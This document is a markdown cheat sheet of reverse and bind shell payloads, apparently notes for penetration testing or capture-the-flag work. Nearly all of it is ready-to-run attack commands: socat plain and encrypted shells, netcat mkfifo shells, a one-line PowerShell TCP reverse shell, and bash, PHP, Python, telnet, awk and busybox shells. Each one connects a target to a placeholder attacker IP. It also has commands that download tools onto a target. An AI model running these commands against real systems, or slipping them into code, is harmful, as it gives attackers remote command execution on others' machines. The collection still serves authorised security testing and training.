# Shells

```
python -m http.server 80
```
```
wget <LOCAL-IP>/socat -O /tmp/socat
```
```
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

## Change terminal size

```
stty -a #get current shell parameters
stty rows <number>
stty cols <number>
```

## Stabilize netcat shell:

### Linux Attacker

```
python(2/3) -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL-Z -> stty raw -echo; fg
```

### Attacker:

```
rlwrap nc -lvnp <port>
stty raw -echo; fg 
```

## Socat

Basic socat listener (attacker)

```
socat TCP-L:<port>
```

Connect back on Windows (target)
```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Connect back Linux (target)

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" 
```

Bind shell listener (target)
```
socat TCP-L:<PORT> EXEC:"bash -li"
```

Bind shell listener Windows (target)
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes 
```

Bind shell connect (attacker)
```
socat TCP:<TARGET-IP>:<TARGET-PORT> - #Bind shell connect (attacker)
```

socat stable listener
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0 
```

#stable listener connect
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## socat encrypted shells

create encryption key and certificate
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

#merge key and cert to pem file
```
cat shell.key shell.crt > shell.pem
```

#encrypted reverse shell listener
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0
```

connect back
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash 
```

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes #bind shell (target)
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - #bind shell connect (attacker)

socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 #socat linux stable listener
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane  #socat linux stable listener connect


mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f #make linux bind shell listener
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f #connect to listener

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" #powershell reverse shell


## Bash

### Normal Bash Reverse Shell

```
target@foo:~$ bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1 
```
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.


### Bash Read Line Reverse Shell

```
target@foo:~$ exec 5<>/dev/tcp/<ATTACKER_IP>/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```
This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.


### Bash With File Descriptor 196 Reverse Shell

```
target@foo:~$ 0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/443; sh <&196 >&196 2>&196 
```

This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.


### Bash With File Descriptor 5 Reverse Shell

```
target@foo:~$ bash -i 5<> /dev/tcp/<ATTACKER_IP>/443 0<&5 1>&5 2>&5
```

Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

## PHP

### PHP Reverse Shell Using the exec Function

```
target@foo:~$ php -r '$sock=fsockopen("<ATTACKER_IP>",443);exec("sh <&3 >&3 2>&3");' 
```

This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.


### PHP Reverse Shell Using the shell_exec Function

```
target@foo:~$ php -r '$sock=fsockopen("<ATTACKER_IP>",443);shell_exec("sh <&3 >&3 2>&3");'
```
Similar to the previous command, but uses the shell_exec function.


### PHP Reverse Shell Using the system Function

```
target@foo:~$ php -r '$sock=fsockopen("<ATTACKER_IP>",443);system("sh <&3 >&3 2>&3");' 
```
This reverse shell employs the system function, which executes the command and outputs the result to the browser.


### PHP Reverse Shell Using the passthru Function

```
target@foo:~$ php -r '$sock=fsockopen("<ATTACKER_IP>",443);passthru("sh <&3 >&3 2>&3");'
```
The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.


### PHP Reverse Shell Using the popen Function

```
target@foo:~$ php -r '$sock=fsockopen("<ATTACKER_IP>",443);popen("sh <&3 >&3 2>&3", "r");' 
```
This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

## Python
Please note, the following snippets below require using python -c to run, indicated by the placeholder PY-C

### Python Reverse Shell by Exporting Environment Variables

```
target@foo:~$ export RHOST="<ATTACKER_IP>"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

### Python Reverse Shell Using the subprocess Module

```
target@foo:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

### Short Python Reverse Shell

```
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

## Others

### Telnet

```
target@foo:~$ TF=$(mktemp -u); mkfifo $TF && telnet <ATTACKER_IP>443 0<$TF | sh 1>$TF
```
This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 

### AWK

```
target@foo:~$ awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER_IP>/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

### BusyBox

```
target@foo:~$ busybox nc <ATTACKER_IP> 443 -e sh
```

This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.